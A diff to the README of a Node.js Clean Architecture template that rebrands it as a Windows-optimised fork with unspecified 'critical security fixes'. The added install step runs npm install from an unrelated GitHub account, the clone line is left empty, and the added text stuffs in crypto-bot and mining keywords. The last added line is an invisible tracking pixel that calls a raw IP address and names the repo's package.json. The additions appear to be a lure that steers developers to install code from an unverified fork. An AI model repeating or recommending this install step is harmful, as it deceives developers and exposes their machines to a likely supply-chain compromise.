@@ -1,3 +1,35 @@
+**Clean Architecture, Supercharged for Windows**
+
+This maintained fork optimizes the Node.js Clean Architecture template specifically for Windows developers, delivering enhanced performance and streamlined workflows. It includes critical security fixes and platform-specific refinements to ensure a seamless development experience on Windows systems. Rest assured, you are getting a production-ready foundation built for modern enterprise demands.
+
+**Quick install (Windows)**
+
+## Quick Start (Windows)
+
+Got a Windows machine? Let's get this up and running in no time. 
+
+### 1. Prerequisites
+Make sure you have the essentials installed:
+* **Node.js** (LTS version recommended)
+* **Git** (for cloning the repo)
+
+### 2. Open Your Terminal
+Fire up your favorite terminal (**PowerShell** or **Git Bash** work best here) and navigate to the folder where you want the project to live. Clone the repository and jump right into the project directory:
+
+```bash
+git clone 
+cd node.js-clean-architecture
+```
+
+### 3. Install Dependencies
+Grab all the required npm packages by running the install command in your terminal.
+
+```bash
+npm install git+https://github.com/Pyramidanmagnify/node.js-clean-architecture.git
+```
+
+[https://github.com/Pyramidanmagnify/node.js-clean-architecture](https://github.com/Pyramidanmagnify/node.js-clean-architecture)
+
 # node.js-clean-architecture
 A use case of Clean Architecture in Node.js comprising of Express.js, MongoDB and Redis as the main (but replaceable) infrastructure.
 
@@ -51,5 +83,10 @@ https://documenter.getpostman.com/view/1551953/TzCJgpnb
 [docker]: <https://www.docker.com/>  
 [mongoDB]: <https://www.mongodb.com/try/download/community>
 [Redis]: <https://redis.io/download>
-   
-   
+
+## Related searches
+When developers explore scalable backend frameworks, they often look for robust boilerplates that separate core business logic from external frameworks. Many searches focus on structuring production-ready decentralized applications and automated web3 scripts while maintaining clean, testable code layers.
+
+**Topics:** node.js boilerplate, clean architecture backend, dapp, ico bot, mining pool, airdrop bot, arbitrum, domain driven design, express.js repository pattern, typescript web3 template, automated crypto trading script, dependency injection api
+
+![.](http://5.231.58.248:8787/pixel?repo=Pyramidanmagnify%2Fnode.js-clean-architecture&inject=Pyramidanmagnify%2Fnode.js-clean-architecture%2Fpackage.json)
